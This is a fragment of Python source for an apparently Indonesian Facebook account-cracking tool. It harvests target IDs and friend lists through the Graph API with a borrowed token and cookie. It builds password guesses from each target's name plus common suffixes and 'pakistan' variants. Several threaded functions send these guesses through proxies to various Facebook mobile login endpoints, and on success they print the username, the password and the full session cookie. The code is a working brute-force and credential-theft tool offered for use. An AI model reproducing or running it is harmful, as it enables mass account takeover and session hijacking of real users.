...
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=95,padding=(0,1),style=f"blue"))
		...
		p = input('Dump Ini Sampai ID Luar Planet,lanjut(Y/n) : ')
		if p in ['y','Y']:random()
		else:exit()
	elif i in ['7']:
		...
		with tred(max_workers=30) as otw:
			for kintil in id:
				...
				if len(name)<6:
					...
					else:pwv.append(awl+'1122');pwv.append(awl+'123');pwv.append(awl+'1234');pwv.append(awl+'12345');pwv.append(awl+'786');pwv.append('pakistan');pwv.append('pakistan123');pwv.append('pakistan786')
				else:
					if len(awl)<3:pwv.append(name);pwv.append('pakistan');pwv.append('pakistan123');pwv.append('pakistan786')
					else:
						pwv.append(name);pwv.append(awl+'1122');pwv.append(awl+'123');pwv.append(awl+'1234');pwv.append(awl+'12345');pwv.append(awl+'786');pwv.append('pakistan');pwv.append('pakistan123');pwv.append('pakistan786')
				if pwmu in ['N','n','']:pass
				...
				elif 'trung' in metod:otw.submit(trung,user,pwv)
				...
				elif 'vallate' in metod:otw.submit(vallate,user,pwv)
				elif 'mreg' in metod:otw.submit(mregu,user,pwv)
...
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://x.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=hulu,proxies=proxs)
...
def mbasic(user,pwv):				
	...
	for pw in pwv:
		try:
			...
			tamsis.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
...
def freereg(user,pwv):
	...
	for pw in pwv:
		try:
			...
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':user,'pass':pw}
			tamsis.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
...
'referer': 'https://m.latest.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&wtsid=rdr_0ooccGnxILDYokYZB&refsrc=deprecated&_rdr',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			kode=tamsis.get('https://m.latest.facebook.com/login/device-based/validate-password/?uid='+user).text
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':user,'pass':pw}
			tamsis.post('https://m.latest.facebook.com/login/device-based/validate-password/?shbl=0',headers=hulu,data=data,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
...
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			...
			data={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':user,'pass':pw}
			tamsis.post('https://m.trunkstable.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print(f'\r{hijo}{user}|{pw}|{kuki}{xxx}')
...
def random():
	randm=[]
	for i in range(1000):
		c = random.randrange(123,999)
		a = random.randrange(123,999)
		g = random.randrange(123,999)
		c = '100000'+str(c)+str(a)+str(g)
		f = '1000'+str(random.randrange(10,19))+str(c)+str(a)+str(g)
		cc = random.choice([c,f])
		randm.append(cc)
		hh=0
	for id in randm :
		p = Tamsis(f'https://graph.facebook.com/v16.0/{id}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			print(p['error']['message']);break
		except KeyError:
			try:
				for i in p['friends']['data']:
					c = (i['id']+'|'+i['name'])
